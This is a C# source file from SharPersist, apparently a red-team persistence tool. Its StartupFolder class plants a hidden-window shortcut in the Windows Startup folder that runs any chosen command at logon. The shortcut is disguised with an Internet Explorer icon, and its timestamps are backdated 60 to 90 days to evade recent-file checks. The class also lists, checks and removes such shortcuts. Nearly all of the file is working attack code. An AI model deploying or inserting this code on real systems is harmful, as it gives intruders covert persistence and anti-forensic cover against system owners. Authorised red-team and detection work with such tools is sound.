using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace SharPersist
{
    public class StartupFolder : Persistence
    {
        private static Type m_type = Type.GetTypeFromProgID("WScript.Shell");
        private static object m_shell = Activator.CreateInstance(m_type);

        public StartupFolder(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option) : base(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status,option)
        {
            initialize(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status, option);

        }

        // initial function to decide which method needs performed and if valid args given
        public void initialize(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status, string option)
        {
            if (status.ToLower().Equals("add"))
            {
                if (command.Equals("") || filePath.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give both a command and a file name. See help (-h).");
                    return;
                }

                addPersistence(command, commandArg, filePath);
            }

            else if (status.ToLower().Equals("remove"))
            {
                if (filePath.Equals(""))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must give a file name. See help (-h).");
                    return;
                }

                removePersistence(filePath);
            }

            else if (status.ToLower().Equals("check"))
            {
                checkPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }

            else if (status.ToLower().Equals("list"))
            {
                listPersistence(persistMethod, command, commandArg, theKey, theVal, theName, filePath, status);
            }


            else
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: Invalid method given. Must give add, remove, check or list. See help (-h).");
                return;
            }
        } // end initialize method

        
        // add persistence trigger
        public void addPersistence(string command, string commandArg, string fileName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Adding startup folder persistence");
            Console.WriteLine("[*] INFO: Command: " + command);
            Console.WriteLine("[*] INFO: Command Args: " + commandArg);
            Console.WriteLine("[*] INFO: File Name: " + fileName);
            Console.WriteLine("");


            // full lnk file path
            string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";

            // if a lnk file already exists by that name, inform user and then return
            if (File.Exists(lnkPath + fileName + ".lnk"))
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: LNK file with that name already exists. Please specify a different name.");
                return;
            } // end if a lnk file already exists by that name

            // create the lnk file
            IWshShortcut shortcut = (IWshShortcut)m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, m_shell, new object[] { lnkPath + fileName + ".lnk" });
            shortcut.TargetPath = command;
            shortcut.Arguments = commandArg;
            shortcut.IconLocation = @"C:\Program Files (x86)\Internet Explorer\iexplore.exe";
            shortcut.WindowStyle = 7; // hidden style
            shortcut.Save();

            // get current file attributes for the lnk file created
            DateTime creationTime = File.GetCreationTime(lnkPath + fileName + ".lnk");
            DateTime lastAccessTime = File.GetLastAccessTime(lnkPath + fileName + ".lnk");
            DateTime lastWriteTime = File.GetLastWriteTime(lnkPath + fileName + ".lnk");

            // set file attributes back between 60 and 90 days to prevent from being seen in any recent file checks
            Random r = new Random();
            int numDays = r.Next(60, 90);

            File.SetCreationTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1));
            File.SetLastAccessTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1));
            File.SetLastWriteTime(lnkPath + fileName + ".lnk", DateTime.Now.AddDays(numDays * -1));



            if (File.Exists(lnkPath + fileName + ".lnk"))
            {
                Console.WriteLine("");
                Console.WriteLine("[+] SUCCESS: Startup folder persistence created");
                Console.WriteLine("[*] INFO: LNK File located at: " + lnkPath + fileName + ".lnk");
                Console.WriteLine("[*] INFO: SHA256 Hash of LNK file: " + lib.Utils.SHA256CheckSum(lnkPath + fileName + ".lnk"));
                Console.WriteLine("");
            }
            else
            {
                Console.WriteLine("[-] ERROR: Startup folder persistence not created");
                return;

            }
        } // end add persistence method


        // remove persistence trigger
        public void removePersistence(string fileName)
        {
            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Removing startup folder persistence");
            Console.WriteLine("[*] INFO: File Name: " + fileName);
            Console.WriteLine("");

            string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";

            try
            {
                if (!System.IO.File.Exists(lnkPath + fileName + ".lnk"))
                {
                    Console.WriteLine("");
                    Console.WriteLine("[-] ERROR: Must provide LNK file that already exists to remove. Please check name again.");
                    return;
                }
            }
            catch (System.IO.FileNotFoundException ex)
            {
                Console.WriteLine("");
                Console.WriteLine("[-] ERROR: LNK file was not found. Please check path.");
                return;
            }

            System.IO.File.Delete(lnkPath + fileName + ".lnk");

            if (!File.Exists(lnkPath + fileName + ".lnk"))
            {

                Console.WriteLine("");
                Console.WriteLine("[+] SUCCESS: Startup folder persistence removed");
            }
            else
            {
                Console.WriteLine("[-] ERROR: Startup folder persistence was not removed");

            }

        } // end remove persistence methdo


        // check for persistence technique
        public void checkPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {
            string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking if that file already exists in: " + lnkPath);


            // if a lnk file already exists by that name, inform user and then return
            if (File.Exists(lnkPath + filePath + ".lnk"))
            {
                Console.WriteLine("[-] ERROR: LNK file with that name already exists.");
            } // end if a lnk file already exists by that name

            else
            {
                Console.WriteLine("[+] SUCCESS: LNK file with that name does NOT exist");
            }


            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Checking for correct arguments given");

            if (command.Equals("") || filePath.Equals(""))
            {
                Console.WriteLine("[-] ERROR: Must give both a command and a file name. See help (-h).");
                return;
            }

            Console.WriteLine("[+] SUCCESS: Correct arguments given");

        } // end check persistence method


        // list persistence
        public void listPersistence(string persistMethod, string command, string commandArg, string theKey, string theVal, string theName, string filePath, string status)
        {
            string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";

            Console.WriteLine("");
            Console.WriteLine("[*] INFO: Listing all LNK files in startup folder persistence location.");
            Console.WriteLine("[*] INFO: Current LNK files in: " + lnkPath);

            DirectoryInfo d = new DirectoryInfo(lnkPath); // get the directory where lnk file will be placed

            // iterate through all lnk files and display lnk file attributes
            foreach (var file in d.GetFiles("*.lnk"))
            {
                IWshShortcut shortcut = (IWshShortcut)m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, m_shell, new object[] { lnkPath + file });
                Console.WriteLine("");
                Console.WriteLine("");
                Console.WriteLine("[*] INFO: LNK File Name: " + file.Name);
                Console.WriteLine("[*] INFO: LNK Description: " + shortcut.Description);
                Console.WriteLine("[*] INFO: LNK Target Path: " + shortcut.TargetPath);
                Console.WriteLine("[*] INFO: LNK Arguments: " + shortcut.Arguments);

            } // end for each lnk file

        } // end list persistence method



        // interface to be used for creating lnk file so we don't need any external references
        [ComImport, TypeLibType((short)0x1040), Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
        interface IWshShortcut
        {
            [DispId(0)]
            string FullName { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0)] get; }
            [DispId(0x3e8)]
            string Arguments { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3e8)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3e8)] set; }
            [DispId(0x3e9)]
            string Description { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3e9)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3e9)] set; }
            [DispId(0x3ea)]
            string Hotkey { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ea)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ea)] set; }
            [DispId(0x3eb)]
            string IconLocation { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3eb)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3eb)] set; }
            [DispId(0x3ec)]
            string RelativePath { [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ec)] set; }
            [DispId(0x3ed)]
            string TargetPath { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ed)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ed)] set; }
            [DispId(0x3ee)]
            int WindowStyle { [DispId(0x3ee)] get; [param: In] [DispId(0x3ee)] set; }
            [DispId(0x3ef)]
            string WorkingDirectory { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ef)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ef)] set; }
            [TypeLibFunc((short)0x40), DispId(0x7d0)]
            void Load([In, MarshalAs(UnmanagedType.BStr)] string PathLink);
            [DispId(0x7d1)]
            void Save();

        } // end IWshShortcut interface



    } // end StartupFolder class

} // end namespace
